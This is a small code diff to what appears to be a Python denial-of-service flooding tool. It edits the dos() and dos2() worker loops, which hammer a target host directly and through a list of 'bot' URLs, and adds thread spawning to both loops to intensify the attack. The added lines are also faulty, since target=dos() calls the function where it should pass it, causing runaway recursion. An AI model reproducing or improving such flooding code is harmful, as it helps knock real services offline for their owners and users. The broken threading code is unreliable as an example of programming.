@@ -903,6 +903,9 @@ def dos():
 		item = q.get()
 		down_it(item)
 		q.task_done()
+		t = threading.Thread(target=dos())
+		t.start()
+		t.join()
 
 
 def dos2():
@@ -910,6 +913,9 @@ def dos2():
 		item=w.get()
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
+		t = threading.Thread(target=dos2())
+		t.start()
+		t.join()
 
 
 def usage():
